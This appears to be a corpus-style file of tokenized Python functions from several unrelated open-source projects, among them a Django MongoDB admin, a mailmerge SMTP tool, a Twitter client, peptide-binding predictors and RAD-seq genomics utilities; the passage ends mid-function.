def post ( self , request , * args , * * kwargs ) : # TODO - make sure to check the rights of the poster #self.get queryset() # TODO - write something that grabs the document class better form class = self . get form class ( ) form = self . get form ( form class ) mongo ids = self . get initial ( ) [ 'mongo id' ] for form mongo id in form . data . getlist ( 'mongo id' ) : for mongo id in mongo ids : if form mongo id == mongo id : self . document . objects . get ( pk = mongo id ) . delete ( ) return self . form invalid ( form )
def get mongoadmins ( self ) : apps = [ ] for app name in settings . INSTALLED APPS : mongoadmin = "{0}.mongoadmin" . format ( app name ) try : module = import module ( mongoadmin ) except Import Error as e : if str ( e ) . startswith ( "No module named" ) : continue raise e app store = App Store ( module ) apps . append ( dict ( app name = app name , obj = app store ) ) return apps
def set mongonaut base ( self ) : if hasattr ( self , "app label" ) : # prevents us from calling this multiple times return None self . app label = self . kwargs . get ( 'app label' ) self . document name = self . kwargs . get ( 'document name' ) # TODO Allow this to be assigned via url variable self . models name = self . kwargs . get ( 'models name' , 'models' ) # import the models file self . model name = "{0}.{1}" . format ( self . app label , self . models name ) self . models = import module ( self . model name )
def set permissions in context ( self , context = { } ) : context [ 'has view permission' ] = self . mongoadmin . has view permission ( self . request ) context [ 'has edit permission' ] = self . mongoadmin . has edit permission ( self . request ) context [ 'has add permission' ] = self . mongoadmin . has add permission ( self . request ) context [ 'has delete permission' ] = self . mongoadmin . has delete permission ( self . request ) return context
def set embedded doc ( self , document , form key , current key , remaining key ) : embedded doc = getattr ( document , current key , False ) if not embedded doc : embedded doc = document . fields [ current key ] . document type obj ( ) new key , new remaining key array = trim field key ( embedded doc , remaining key ) self . process document ( embedded doc , form key , make key ( new key , new remaining key array ) ) setattr ( document , current key , embedded doc )
def with tz ( request ) : dt = datetime . now ( ) t = Template ( '{% load tz %}{% localtime on %}{% get current timezone as TIME ZONE %}{{ TIME ZONE }}{% endlocaltime %}' ) c = Request Context ( request ) response = t . render ( c ) return Http Response ( response )
def without tz ( request ) : t = Template ( '{% load tz %}{% get current timezone as TIME ZONE %}{{ TIME ZONE }}' ) c = Request Context ( request ) response = t . render ( c ) return Http Response ( response )
def is valid ip ( ip address ) : try : ip = ipaddress . ip address ( u'' + ip address ) return True except Value Error as e : return False
def is local ip ( ip address ) : try : ip = ipaddress . ip address ( u'' + ip address ) return ip . is loopback except Value Error as e : return None
def search ( self ) : try : filters = json . loads ( self . query ) except Value Error : return False result = self . model query if 'filter' in filters . keys ( ) : result = self . parse filter ( filters [ 'filter' ] ) if 'sort' in filters . keys ( ) : result = result . order by ( * self . sort ( filters [ 'sort' ] ) ) return result
def parse filter ( self , filters ) : for filter type in filters : if filter type == 'or' or filter type == 'and' : conditions = [ ] for field in filters [ filter type ] : if self . is field allowed ( field ) : conditions . append ( self . create query ( self . parse field ( field , filters [ filter type ] [ field ] ) ) ) if filter type == 'or' : self . model query = self . model query . filter ( or ( * conditions ) ) elif filter type == 'and' : self . model query = self . model query . filter ( and ( * conditions ) ) else : if self . is field allowed ( filter type ) : conditions = self . create query ( self . parse field ( filter type , filters [ filter type ] ) ) self . model query = self . model query . filter ( conditions ) return self . model query
def create query ( self , attr ) : field = attr [ 0 ] operator = attr [ 1 ] value = attr [ 2 ] model = self . model if '.' in field : field items = field . split ( '.' ) field name = getattr ( model , field items [ 0 ] , None ) class name = field name . property . mapper . class new model = getattr ( class name , field items [ 1 ] ) return field name . has ( OPERATORS [ operator ] ( new model , value ) ) return OPERATORS [ operator ] ( getattr ( model , field , None ) , value )
def sendmail ( self , msg from , msg to , msg ) : SMTP dummy . msg from = msg from SMTP dummy . msg to = msg to SMTP dummy . msg = msg
def parsemail ( raw message ) : message = email . parser . Parser ( ) . parsestr ( raw message ) # Detect encoding detected = chardet . detect ( bytearray ( raw message , "utf-8" ) ) encoding = detected [ "encoding" ] print ( ">>> encoding {}" . format ( encoding ) ) for part in message . walk ( ) : if part . get content maintype ( ) == 'multipart' : continue part . set charset ( encoding ) # Extract recipients addrs = email . utils . getaddresses ( message . get all ( "TO" , [ ] ) ) + email . utils . getaddresses ( message . get all ( "CC" , [ ] ) ) + email . utils . getaddresses ( message . get all ( "BCC" , [ ] ) ) recipients = [ x [ 1 ] for x in addrs ] message . delitem ( "bcc" ) message . setitem ( 'Date' , email . utils . formatdate ( ) ) sender = message [ "from" ] return ( message , sender , recipients )
def create boundary ( message ) : if not message . is multipart ( ) or message . get boundary ( ) is not None : return message # HACK: Python2 lists do not natively have a `copy` method. Unfortunately, # due to a bug in the Backport for the email module, the method # `Message.set boundary` converts the Message headers into a native list, # so that other methods that rely on "copying" the Message headers fail. # `Message.set boundary` is called from `Generator.handle multipart` if the # message does not already have a boundary present. (This method itself is # called from `Message.as string`.) # Hence, to prevent `Message.set boundary` from being called, add a # boundary header manually. from future . backports . email . generator import Generator # pylint: disable=protected-access boundary = Generator . make boundary ( message . policy . linesep ) message . set param ( 'boundary' , boundary ) return message
def make message multipart ( message ) : if not message . is multipart ( ) : multipart message = email . mime . multipart . MIME Multipart ( 'alternative' ) for header key in set ( message . keys ( ) ) : # Preserve duplicate headers values = message . get all ( header key , failobj = [ ] ) for value in values : multipart message [ header key ] = value original text = message . get payload ( ) multipart message . attach ( email . mime . text . MIME Text ( original text ) ) message = multipart message # HACK: For Python2 (see comments in ` create boundary`) message = create boundary ( message ) return message
def convert markdown ( message ) : assert message [ 'Content-Type' ] . startswith ( "text/markdown" ) del message [ 'Content-Type' ] # Convert the text from markdown and then make the message multipart message = make message multipart ( message ) for payload item in set ( message . get payload ( ) ) : # Assume the plaintext item is formatted with markdown. # Add corresponding HTML version of the item as the last part of # the multipart message (as per RFC 2046) if payload item [ 'Content-Type' ] . startswith ( 'text/plain' ) : original text = payload item . get payload ( ) html text = markdown . markdown ( original text ) html payload = future . backports . email . mime . text . MIME Text ( "<html><body>{}</body></html>" . format ( html text ) , "html" , ) message . attach ( html payload ) return message
def addattachments ( message , template path ) : if 'attachment' not in message : return message , 0 message = make message multipart ( message ) attachment filepaths = message . get all ( 'attachment' , failobj = [ ] ) template parent dir = os . path . dirname ( template path ) for attachment filepath in attachment filepaths : attachment filepath = os . path . expanduser ( attachment filepath . strip ( ) ) if not attachment filepath : continue if not os . path . isabs ( attachment filepath ) : # Relative paths are relative to the template's parent directory attachment filepath = os . path . join ( template parent dir , attachment filepath ) normalized path = os . path . abspath ( attachment filepath ) # Check that the attachment exists if not os . path . exists ( normalized path ) : print ( "Error: can't find attachment " + normalized path ) sys . exit ( 1 ) filename = os . path . basename ( normalized path ) with open ( normalized path , "rb" ) as attachment : part = email . mime . application . MIME Application ( attachment . read ( ) , Name = filename ) part . add header ( 'Content-Disposition' , 'attachment; filename="{}"' . format ( filename ) ) message . attach ( part ) print ( ">>> attached {}" . format ( normalized path ) ) del message [ 'attachment' ] return message , len ( attachment filepaths )
def sendmail ( message , sender , recipients , config filename ) : # Read config file from disk to get SMTP server host, port, username if not hasattr ( sendmail , "host" ) : config = configparser . Raw Config Parser ( ) config . read ( config filename ) sendmail . host = config . get ( "smtp server" , "host" ) sendmail . port = config . getint ( "smtp server" , "port" ) sendmail . username = config . get ( "smtp server" , "username" ) sendmail . security = config . get ( "smtp server" , "security" ) print ( ">>> Read SMTP server configuration from {}" . format ( config filename ) ) print ( ">>>   host = {}" . format ( sendmail . host ) ) print ( ">>>   port = {}" . format ( sendmail . port ) ) print ( ">>>   username = {}" . format ( sendmail . username ) ) print ( ">>>   security = {}" . format ( sendmail . security ) ) # Prompt for password if not hasattr ( sendmail , "password" ) : if sendmail . security == "Dummy" or sendmail . username == "None" : sendmail . password = None else : prompt = ">>> password for {} on {}: " . format ( sendmail . username , sendmail . host ) sendmail . password = getpass . getpass ( prompt ) # Connect to SMTP server if sendmail . security == "SSL/TLS" : smtp = smtplib . SMTP SSL ( sendmail . host , sendmail . port ) elif sendmail . security == "STARTTLS" : smtp = smtplib . SMTP ( sendmail . host , sendmail . port ) smtp . ehlo ( ) smtp . starttls ( ) smtp . ehlo ( ) elif sendmail . security == "Never" : smtp = smtplib . SMTP ( sendmail . host , sendmail . port ) elif sendmail . security == "Dummy" : smtp = smtp dummy . SMTP dummy ( ) else : raise configparser . Error ( "Unrecognized security type: {}" . format ( sendmail . security ) ) # Send credentials if sendmail . username != "None" : smtp . login ( sendmail . username , sendmail . password ) # Send message.  Note that we can't use the elegant # "smtp.send message(message)" because that's python3 only smtp . sendmail ( sender , recipients , message . as string ( ) ) smtp . close ( )
def create sample input files ( template filename , database filename , config filename ) : print ( "Creating sample template email {}" . format ( template filename ) ) if os . path . exists ( template filename ) : print ( "Error: file exists: " + template filename ) sys . exit ( 1 ) with io . open ( template filename , "w" ) as template file : template file . write ( u"TO: {{email}}\n" u"SUBJECT: Testing mailmerge\n" u"FROM: My Self <myself@mydomain.com>\n" u"\n" u"Hi, {{name}},\n" u"\n" u"Your number is {{number}}.\n" ) print ( "Creating sample database {}" . format ( database filename ) ) if os . path . exists ( database filename ) : print ( "Error: file exists: " + database filename ) sys . exit ( 1 ) with io . open ( database filename , "w" ) as database file : database file . write ( u'email,name,number\n' u'myself@mydomain.com,"Myself",17\n' u'bob@bobdomain.com,"Bob",42\n' ) print ( "Creating sample config file {}" . format ( config filename ) ) if os . path . exists ( config filename ) : print ( "Error: file exists: " + config filename ) sys . exit ( 1 ) with io . open ( config filename , "w" ) as config file : config file . write ( u"# Example: G Mail\n" u"[smtp server]\n" u"host = smtp.gmail.com\n" u"port = 465\n" u"security = SSL/TLS\n" u"username = YOUR USERNAME HERE\n" u"#\n" u"# Example: Wide open\n" u"# [smtp server]\n" u"# host = open-smtp.example.com\n" u"# port = 25\n" u"# security = Never\n" u"# username = None\n" u"#\n" u"# Example: University of Michigan\n" u"# [smtp server]\n" u"# host = smtp.mail.umich.edu\n" u"# port = 465\n" u"# security = SSL/TLS\n" u"# username = YOUR USERNAME HERE\n" u"#\n" u"# Example: University of Michigan EECS Dept., with STARTTLS security\n" # noqa: E501 u"# [smtp server]\n" u"# host = newman.eecs.umich.edu\n" u"# port = 25\n" u"# security = STARTTLS\n" u"# username = YOUR USERNAME HERE\n" u"#\n" u"# Example: University of Michigan EECS Dept., with no encryption\n" # noqa: E501 u"# [smtp server]\n" u"# host = newman.eecs.umich.edu\n" u"# port = 25\n" u"# security = Never\n" u"# username = YOUR USERNAME HERE\n" ) print ( "Edit these files, and then run mailmerge again" )
def cli ( sample , dry run , limit , no limit , database filename , template filename , config filename ) : # pylint: disable=too-many-arguments mailmerge . api . main ( sample = sample , dry run = dry run , limit = limit , no limit = no limit , database filename = database filename , template filename = template filename , config filename = config filename , )
async def run tasks ( self ) : tasks = self . get tasks ( ) self . gathered tasks = asyncio . gather ( * tasks , loop = self . loop ) try : await self . gathered tasks except Cancelled Error : pass
async def close ( self ) : tasks = self . get close tasks ( ) if tasks : await asyncio . wait ( tasks ) self . session = None
def set debug ( ) : logging . basic Config ( level = logging . WARNING ) peony . logger . set Level ( logging . DEBUG )
def clone with updates ( self , * * kwargs ) : fields dict = self . to dict ( ) fields dict . update ( kwargs ) return Binding Prediction ( * * fields dict )
def get data ( self , response ) : if self . response list : return response elif self . response key is None : if hasattr ( response , "items" ) : for key , data in response . items ( ) : if ( hasattr ( data , " getitem " ) and not hasattr ( data , "items" ) and len ( data ) > 0 and 'id' in data [ 0 ] ) : self . response key = key return data else : self . response list = True return response else : return response [ self . response key ] raise No Data Found ( response = response , url = self . request . get url ( ) )
def parse netchop ( netchop output ) : line iterator = iter ( netchop output . decode ( ) . split ( "\n" ) ) scores = [ ] for line in line iterator : if "pos" in line and 'AA' in line and 'score' in line : scores . append ( [ ] ) if "----" not in next ( line iterator ) : raise Value Error ( "Dashes expected" ) line = next ( line iterator ) while '-------' not in line : score = float ( line . split ( ) [ 3 ] ) scores [ - 1 ] . append ( score ) line = next ( line iterator ) return scores
def to dataframe ( self , columns = Binding Prediction . fields + ( "length" , ) ) : return pd . Data Frame . from records ( [ tuple ( [ getattr ( x , name ) for name in columns ] ) for x in self ] , columns = columns )
def predict peptides ( self , peptides ) : # importing locally to avoid slowing down CLI applications which # don't use MH Cflurry from mhcflurry . encodable sequences import Encodable Sequences binding predictions = [ ] encodable sequences = Encodable Sequences . create ( peptides ) for allele in self . alleles : predictions df = self . predictor . predict to dataframe ( encodable sequences , allele = allele ) for ( , row ) in predictions df . iterrows ( ) : binding prediction = Binding Prediction ( allele = allele , peptide = row . peptide , affinity = row . prediction , percentile rank = ( row . prediction percentile if 'prediction percentile' in row else nan ) , prediction method name = "mhcflurry" ) binding predictions . append ( binding prediction ) return Binding Prediction Collection ( binding predictions )
def check peptide inputs ( self , peptides ) : require iterable of ( peptides , string types ) check X = not self . allow X in peptides check lower = not self . allow lowercase in peptides check min length = self . min peptide length is not None min length = self . min peptide length check max length = self . max peptide length is not None max length = self . max peptide length for p in peptides : if not p . isalpha ( ) : raise Value Error ( "Invalid characters in peptide '%s'" % p ) elif check X and "X" in p : raise Value Error ( "Invalid character 'X' in peptide '%s'" % p ) elif check lower and not p . isupper ( ) : raise Value Error ( "Invalid lowercase letters in peptide '%s'" % p ) elif check min length and len ( p ) < min length : raise Value Error ( "Peptide '%s' too short (%d chars), must be at least %d" % ( p , len ( p ) , min length ) ) elif check max length and len ( p ) > max length : raise Value Error ( "Peptide '%s' too long (%d chars), must be at least %d" % ( p , len ( p ) , max length ) )
async def restart stream ( self ) : await self . response . release ( ) await asyncio . sleep ( self . error timeout ) await self . connect ( ) logger . info ( "Reconnected to the stream" ) self . reconnecting = False return { 'stream restart' : True }
def get error ( data ) : if isinstance ( data , dict ) : if 'errors' in data : error = data [ 'errors' ] [ 0 ] else : error = data . get ( 'error' , None ) if isinstance ( error , dict ) : if error . get ( 'code' ) in errors : return error
async def throw ( response , loads = None , encoding = None , * * kwargs ) : if loads is None : loads = data processing . loads data = await data processing . read ( response , loads = loads , encoding = encoding ) error = get error ( data ) if error is not None : exception = errors [ error [ 'code' ] ] raise exception ( response = response , error = error , data = data , * * kwargs ) if response . status in statuses : exception = statuses [ response . status ] raise exception ( response = response , data = data , * * kwargs ) # raise Peony Exception if no specific exception was found raise Peony Exception ( response = response , data = data , * * kwargs )
def code ( self , code ) : def decorator ( exception ) : self [ code ] = exception return exception return decorator
def user headers ( self , headers = None ) : h = self . copy ( ) if headers is not None : keys = set ( headers . keys ( ) ) if h . get ( 'Authorization' , False ) : keys -= { 'Authorization' } for key in keys : h [ key ] = headers [ key ] return h
async def run ( self , * args , data ) : cmd = self . get ( data . text ) try : if cmd is not None : command = self [ cmd ] ( * args , data = data ) return await peony . utils . execute ( command ) except : fmt = "Error occurred while running function {cmd}:" peony . utils . log error ( fmt . format ( cmd = cmd ) )
def has edge within group ( self , group ) : assert group in self . nodes . keys ( ) , "{0} not one of the group of nodes" . format ( group ) nodelist = self . nodes [ group ] for n1 , n2 in self . simplified edges ( ) : if n1 in nodelist and n2 in nodelist : return True
def plot axis ( self , rs , theta ) : xs , ys = get cartesian ( rs , theta ) self . ax . plot ( xs , ys , 'black' , alpha = 0.3 )
def plot nodes ( self , nodelist , theta , group ) : for i , node in enumerate ( nodelist ) : r = self . internal radius + i * self . scale x , y = get cartesian ( r , theta ) circle = plt . Circle ( xy = ( x , y ) , radius = self . dot radius , color = self . node colormap [ group ] , linewidth = 0 ) self . ax . add patch ( circle )
def group theta ( self , group ) : for i , g in enumerate ( self . nodes . keys ( ) ) : if g == group : break return i * self . major angle
def find node group membership ( self , node ) : for group , nodelist in self . nodes . items ( ) : if node in nodelist : return group
def get idx ( self , node ) : group = self . find node group membership ( node ) return self . nodes [ group ] . index ( node )
def node radius ( self , node ) : return self . get idx ( node ) * self . scale + self . internal radius
def node theta ( self , node ) : group = self . find node group membership ( node ) return self . group theta ( group )
def add edges ( self ) : for group , edgelist in self . edges . items ( ) : for ( u , v , d ) in edgelist : self . draw edge ( u , v , d , group )
def draw ( self ) : self . ax . set xlim ( - self . plot radius ( ) , self . plot radius ( ) ) self . ax . set ylim ( - self . plot radius ( ) , self . plot radius ( ) ) self . add axes and nodes ( ) self . add edges ( ) self . ax . axis ( 'off' )
def mods genre ( self ) : type2genre = { 'conference' : 'conference publication' , 'book chapter' : 'bibliography' , 'unpublished' : 'article' } tp = str ( self . type ) . lower ( ) return type2genre . get ( tp , tp )
def produce author lists ( self ) : # post-process author names self . authors = self . authors . replace ( ', and ' , ', ' ) self . authors = self . authors . replace ( ',and ' , ', ' ) self . authors = self . authors . replace ( ' and ' , ', ' ) self . authors = self . authors . replace ( ';' , ',' ) # list of authors self . authors list = [ author . strip ( ) for author in self . authors . split ( ',' ) ] # simplified representation of author names self . authors list simple = [ ] # author names represented as a tuple of given and family name self . authors list split = [ ] # tests if title already ends with a punctuation mark self . title ends with punct = self . title [ - 1 ] in [ '.' , '!' , '?' ] if len ( self . title ) > 0 else False suffixes = [ 'I' , 'II' , 'III' , 'IV' , 'V' , 'VI' , 'VII' , 'VIII' , "Jr." , "Sr." ] prefixes = [ 'Dr.' ] prepositions = [ 'van' , 'von' , 'der' , 'de' , 'den' ] # further post-process author names for i , author in enumerate ( self . authors list ) : if author == '' : continue names = author . split ( ' ' ) # check if last string contains initials if ( len ( names [ - 1 ] ) <= 3 ) and names [ - 1 ] not in suffixes and all ( c in ascii uppercase for c in names [ - 1 ] ) : # turn "Gauss CF" into "C. F. Gauss" names = [ c + '.' for c in names [ - 1 ] ] + names [ : - 1 ] # number of suffixes num suffixes = 0 for name in names [ : : - 1 ] : if name in suffixes : num suffixes += 1 else : break # abbreviate names for j , name in enumerate ( names [ : - 1 - num suffixes ] ) : # don't try to abbreviate these if j == 0 and name in prefixes : continue if j > 0 and name in prepositions : continue if ( len ( name ) > 2 ) or ( len ( name ) and ( name [ - 1 ] != '.' ) ) : k = name . find ( '-' ) if 0 < k + 1 < len ( name ) : # take care of dash names [ j ] = name [ 0 ] + '.-' + name [ k + 1 ] + '.' else : names [ j ] = name [ 0 ] + '.' if len ( names ) : self . authors list [ i ] = ' ' . join ( names ) # create simplified/normalized representation of author name if len ( names ) > 1 : for name in names [ 0 ] . split ( '-' ) : name simple = self . simplify name ( ' ' . join ( [ name , names [ - 1 ] ] ) ) self . authors list simple . append ( name simple ) else : self . authors list simple . append ( self . simplify name ( names [ 0 ] ) ) # number of prepositions num prepositions = 0 for name in names : if name in prepositions : num prepositions += 1 # splitting point sp = 1 + num suffixes + num prepositions self . authors list split . append ( ( ' ' . join ( names [ : - sp ] ) , ' ' . join ( names [ - sp : ] ) ) ) # list of authors in Bib Tex format self . authors bibtex = ' and ' . join ( self . authors list ) # overwrite authors string if len ( self . authors list ) > 2 : self . authors = ', and ' . join ( [ ', ' . join ( self . authors list [ : - 1 ] ) , self . authors list [ - 1 ] ] ) elif len ( self . authors list ) > 1 : self . authors = ' and ' . join ( self . authors list ) else : self . authors = self . authors list [ 0 ]
def get publications ( context , template = 'publications/publications.html' ) : types = Type . objects . filter ( hidden = False ) publications = Publication . objects . select related ( ) publications = publications . filter ( external = False , type in = types ) publications = publications . order by ( '-year' , '-month' , '-id' ) if not publications : return '' # load custom links and files populate ( publications ) return render template ( template , context [ 'request' ] , { 'publications' : publications } )
def get publication ( context , id ) : pbl = Publication . objects . filter ( pk = int ( id ) ) if len ( pbl ) < 1 : return '' pbl [ 0 ] . links = pbl [ 0 ] . customlink set . all ( ) pbl [ 0 ] . files = pbl [ 0 ] . customfile set . all ( ) return render template ( 'publications/publication.html' , context [ 'request' ] , { 'publication' : pbl [ 0 ] } )
def get publication list ( context , list , template = 'publications/publications.html' ) : list = List . objects . filter ( list iexact = list ) if not list : return '' list = list [ 0 ] publications = list . publication set . all ( ) publications = publications . order by ( '-year' , '-month' , '-id' ) if not publications : return '' # load custom links and files populate ( publications ) return render template ( template , context [ 'request' ] , { 'list' : list , 'publications' : publications } )
def tex parse ( string ) : string = string . replace ( '{' , '' ) . replace ( '}' , '' ) def tex replace ( match ) : return sub ( r'\^(\w)' , r'<sup>\1</sup>' , sub ( r'\^\{(.*?)\}' , r'<sup>\1</sup>' , sub ( r'\ (\w)' , r'<sub>\1</sub>' , sub ( r'\ \{(.*?)\}' , r'<sub>\1</sub>' , sub ( r'\\(' + GREEK LETTERS + ')' , r'&\1;' , match . group ( 1 ) ) ) ) ) ) return mark safe ( sub ( r'\$([^\$]*)\$' , tex replace , escape ( string ) ) )
def swap ( self , qs ) : try : replacement = qs [ 0 ] except Index Error : # already first/last return if not self . valid ordering reference ( replacement ) : raise Value Error ( "%r can only be swapped with instances of %r which %s equals %r." % ( self , self . class , self . order with respect to , self . get order with respect to ( ) ) ) self . order , replacement . order = replacement . order , self . order self . save ( ) replacement . save ( )
def up ( self ) : self . swap ( self . get ordering queryset ( ) . filter ( order lt = self . order ) . order by ( '-order' ) )
def down ( self ) : self . swap ( self . get ordering queryset ( ) . filter ( order gt = self . order ) )
def to ( self , order ) : if order is None or self . order == order : # object is already at desired position return qs = self . get ordering queryset ( ) if self . order > order : qs . filter ( order lt = self . order , order gte = order ) . update ( order = F ( 'order' ) + 1 ) else : qs . filter ( order gt = self . order , order lte = order ) . update ( order = F ( 'order' ) - 1 ) self . order = order self . save ( )
def above ( self , ref ) : if not self . valid ordering reference ( ref ) : raise Value Error ( "%r can only be moved above instances of %r which %s equals %r." % ( self , self . class , self . order with respect to , self . get order with respect to ( ) ) ) if self . order == ref . order : return if self . order > ref . order : o = ref . order else : o = self . get ordering queryset ( ) . filter ( order lt = ref . order ) . aggregate ( Max ( 'order' ) ) . get ( 'order max' ) or 0 self . to ( o )
def below ( self , ref ) : if not self . valid ordering reference ( ref ) : raise Value Error ( "%r can only be moved below instances of %r which %s equals %r." % ( self , self . class , self . order with respect to , self . get order with respect to ( ) ) ) if self . order == ref . order : return if self . order > ref . order : o = self . get ordering queryset ( ) . filter ( order gt = ref . order ) . aggregate ( Min ( 'order' ) ) . get ( 'order min' ) or 0 else : o = ref . order self . to ( o )
def top ( self ) : o = self . get ordering queryset ( ) . aggregate ( Min ( 'order' ) ) . get ( 'order min' ) self . to ( o )
def bottom ( self ) : o = self . get ordering queryset ( ) . aggregate ( Max ( 'order' ) ) . get ( 'order max' ) self . to ( o )
def populate ( publications ) : customlinks = Custom Link . objects . filter ( publication in = publications ) customfiles = Custom File . objects . filter ( publication in = publications ) publications = { } for publication in publications : publication . links = [ ] publication . files = [ ] publications [ publication . id ] = publication for link in customlinks : publications [ link . publication id ] . links . append ( link ) for file in customfiles : publications [ file . publication id ] . files . append ( file )
def make ( data , samples ) : outfile = open ( os . path . join ( data . dirs . outfiles , data . name + ".vcf" ) , 'w' ) inloci = os . path . join ( data . dirs . outfiles , data . name + ".loci" ) names = [ i . name for i in samples ] names . sort ( ) ## TODO: Get a real version number for the current sw stack version = "0.1" ## TODO: This is just reporting minimum depth per base. Would it be useful to ## report real depth of reads per base? YEAH, that's what supercatg is for. mindepth = data . paramsdict [ "mindepth statistical" ] print >> outfile , "##fileformat=VC Fv4.1" print >> outfile , "##file Date=" + time . strftime ( "%Y%m%d" ) print >> outfile , "##source=ipy RAD.v." + version print >> outfile , "##reference=common allele at each locus" print >> outfile , "##INFO=<ID=NS,Number=1,Type=Integer,Description=\"Number of Samples With Data\">" print >> outfile , "##INFO=<ID=DP,Number=1,Type=Integer,Description=\"Total Depth\">" print >> outfile , "##INFO=<ID=AF,Number=A,Type=Float,Description=\"Allele Frequency\">" print >> outfile , "##INFO=<ID=AA,Number=1,Type=String,Description=\"Ancestral Allele\">" print >> outfile , "##FORMAT=<ID=GT,Number=1,Type=String,Description=\"Genotype\">" print >> outfile , "##FORMAT=<ID=GQ,Number=1,Type=Integer,Description=\"Genotype Quality\">" print >> outfile , "##FORMAT=<ID=DP,Number=1,Type=Integer,Description=\"Read Depth\">" print >> outfile , "\t" . join ( [ "#CHROM" , "POS" , "ID" , "REF" , "ALT" , "QUAL" , "FILTER" , "INFO    " , "FORMAT" ] + list ( names ) ) loci = open ( inloci ) . read ( ) . split ( "|" ) [ : - 1 ] snps = 0 vcflist = [ ] for locusnumber in range ( len ( loci ) ) : samps = [ i . split ( ) [ 0 ] [ 1 : ] for i in loci [ locusnumber ] . strip ( ) . split ( "\n" ) if ">" in i ] loc = np . array ( [ tuple ( i . split ( ) [ - 1 ] ) for i in loci [ locusnumber ] . strip ( ) . split ( "\n" ) if ">" in i ] ) NS = str ( len ( loc ) ) DP = str ( mindepth ) for base in range ( len ( loc . T ) ) : col = [ ] site = list ( loc . T [ base ] ) site = list ( "" . join ( site ) . replace ( "-" , "" ) . replace ( "N" , "" ) ) if site : for bb in site : if bb in list ( "RKYSWM" ) : col += unstruct ( bb ) [ 0 ] col += unstruct ( bb ) [ 1 ] else : col += bb REF = most common ( [ i for i in col if i not in list ( "-RKYSWMN" ) ] ) ALT = set ( [ i for i in col if ( i in list ( "ATGC-N" ) ) and ( i != REF ) ] ) if ALT : snps += 1 GENO = [ REF ] + list ( ALT ) GENOS = [ ] for samp in names : if samp in samps : idx = samps . index ( samp ) f = unstruct ( loc . T [ base ] [ idx ] ) if ( '-' in f ) or ( 'N' in f ) : GENOS . append ( "./." ) else : GENOS . append ( str ( GENO . index ( f [ 0 ] ) ) + "|" + str ( GENO . index ( f [ 1 ] ) ) ) else : GENOS . append ( "./." ) vcflist . append ( "\t" . join ( [ `locusnumber+1` , `base+1` , '.' , REF , "," . join ( ALT ) , "20" , "PASS" , ";" . join ( [ "NS=" + NS , "DP=" + DP ] ) , "GT" ] + GENOS ) ) if not locusnumber % 1000 : outfile . write ( "\n" . join ( vcflist ) + "\n" ) vcflist = [ ] #print >>outfile, "\t".join([`locusnumber+1`, `base+1`, '.', REF, ",".join(ALT), "20", "PASS", #                            ";".join(["NS="+NS, "DP="+DP]), "GT"]+GENOS) outfile . write ( "\n" . join ( vcflist ) ) outfile . close ( )
def count var ( nex ) : arr = np . array ( [ list ( i . split ( ) [ - 1 ] ) for i in nex ] ) miss = np . any ( arr == "N" , axis = 0 ) nomiss = arr [ : , ~ miss ] nsnps = np . invert ( np . all ( nomiss == nomiss [ 0 , : ] , axis = 0 ) ) . sum ( ) return nomiss . shape [ 1 ] , nsnps
def sample loci ( self ) : ## store idx of passing loci idxs = np . random . choice ( self . idxs , self . ntests ) ## open handle, make a proper generator to reduce mem with open ( self . data ) as indata : liter = ( indata . read ( ) . strip ( ) . split ( "|\n" ) ) ## store data as dict seqdata = { i : "" for i in self . samples } ## put chunks into a list for idx , loc in enumerate ( liter ) : if idx in idxs : ## parse chunk lines = loc . split ( "\n" ) [ : - 1 ] names = [ i . split ( ) [ 0 ] for i in lines ] seqs = [ i . split ( ) [ 1 ] for i in lines ] dd = { i : j for i , j in zip ( names , seqs ) } ## add data to concatenated seqdict for name in seqdata : if name in names : seqdata [ name ] += dd [ name ] else : seqdata [ name ] += "N" * len ( seqs [ 0 ] ) ## concatenate into a phylip file return seqdata
def run ( self , ipyclient ) : ## connect to parallel client lbview = ipyclient . load balanced view ( ) ## iterate over tests asyncs = [ ] for test in xrange ( self . ntests ) : ## submit jobs to run async = lbview . apply ( worker , self ) asyncs . append ( async ) ## wait for jobs to finish ipyclient . wait ( ) ## check for errors for async in asyncs : if not async . successful ( ) : raise Exception ( "Error: {}" . format ( async . result ( ) ) ) ## return results as df results = [ i . result ( ) for i in asyncs ] self . results table = pd . Data Frame ( results )
def plot ( self ) : if self . results table == None : return "no results found" else : bb = self . results table . sort values ( by = [ "ABCD" , "ACBD" ] , ascending = [ False , True ] , ) ## make a barplot import toyplot c = toyplot . Canvas ( width = 600 , height = 200 ) a = c . cartesian ( ) m = a . bars ( bb ) return c , a , m
def copy ( self ) : cp = copy . deepcopy ( self ) cp . genotypes = allel . Genotype Array ( self . genotypes , copy = True ) return cp
def sample cleanup ( data , sample ) : umap1file = os . path . join ( data . dirs . edits , sample . name + "-tmp-umap1.fastq" ) umap2file = os . path . join ( data . dirs . edits , sample . name + "-tmp-umap2.fastq" ) unmapped = os . path . join ( data . dirs . refmapping , sample . name + "-unmapped.bam" ) samplesam = os . path . join ( data . dirs . refmapping , sample . name + ".sam" ) split1 = os . path . join ( data . dirs . edits , sample . name + "-split1.fastq" ) split2 = os . path . join ( data . dirs . edits , sample . name + "-split2.fastq" ) refmap derep = os . path . join ( data . dirs . edits , sample . name + "-refmap derep.fastq" ) for f in [ umap1file , umap2file , unmapped , samplesam , split1 , split2 , refmap derep ] : try : os . remove ( f ) except : pass
def fetch cluster se ( data , samfile , chrom , rstart , rend ) : ## If SE then we enforce the minimum overlap distance to avoid the ## staircase syndrome of multiple reads overlapping just a little. overlap buffer = data . hackersonly [ "min SE refmap overlap" ] ## the * buff variables here are because we have to play patty ## cake here with the rstart/rend vals because we want pysam to ## enforce the buffer for SE, but we want the reference sequence ## start and end positions to print correctly for downstream. rstart buff = rstart + overlap buffer rend buff = rend - overlap buffer ## Reads that map to only very short segements of the reference ## sequence will return buffer end values that are before the ## start values causing pysam to complain. Very short mappings. if rstart buff > rend buff : tmp = rstart buff rstart buff = rend buff rend buff = tmp ## Buffering can't make start and end equal or pysam returns nothing. if rstart buff == rend buff : rend buff += 1 ## store pairs rdict = { } clust = [ ] iterreg = [ ] iterreg = samfile . fetch ( chrom , rstart buff , rend buff ) ## use dict to match up read pairs for read in iterreg : if read . qname not in rdict : rdict [ read . qname ] = read ## sort dict keys so highest derep is first ('seed') sfunc = lambda x : int ( x . split ( ";size=" ) [ 1 ] . split ( ";" ) [ 0 ] ) rkeys = sorted ( rdict . keys ( ) , key = sfunc , reverse = True ) ## get blocks from the seed for filtering, bail out if seed is not paired try : read1 = rdict [ rkeys [ 0 ] ] except Value Error : LOGGER . error ( "Found bad cluster, skipping - key:{} rdict:{}" . format ( rkeys [ 0 ] , rdict ) ) return "" ## the starting blocks for the seed poss = 